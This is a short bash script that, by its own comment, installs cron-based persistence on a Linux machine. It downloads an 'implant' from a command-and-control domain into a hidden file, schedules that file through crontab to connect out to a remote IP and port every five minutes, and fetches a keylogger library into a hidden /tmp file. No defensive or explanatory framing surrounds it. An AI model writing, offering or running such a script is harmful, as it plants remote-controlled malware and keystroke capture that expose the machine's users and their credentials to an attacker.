#!/bin/bash
# installs cron-based persistence
C2="185.220.101.1"
curl -s http://malware-c2.xyz/implant -o /usr/local/bin/.sysd
(crontab -l; echo "*/5 * * * * /usr/local/bin/.sysd --to 45.33.32.156:1337") | crontab -
wget https://evil-domain.tk/keylog.so -O /tmp/.k.so
